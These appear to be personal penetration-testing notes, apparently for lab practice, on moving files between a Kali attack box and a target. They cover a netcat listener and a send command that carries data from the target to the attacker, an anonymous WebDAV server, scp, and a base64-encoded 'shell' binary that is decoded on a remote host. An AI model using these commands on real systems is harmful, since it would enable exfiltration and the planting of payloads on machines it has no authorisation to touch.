# FILE TRANSFER
192.168.45.218#nc

```
kali
nc -l -p [port] > out.file

target
nc [destination ip] [destination port] < out.file
```

#webdav
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

#scp
```
scp [file] [user]@[ip]:[destination location]
```

#http_server

#base64 
```shell-session
gyrsec@htb[/htb]$ base64 shell -w 0

user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```
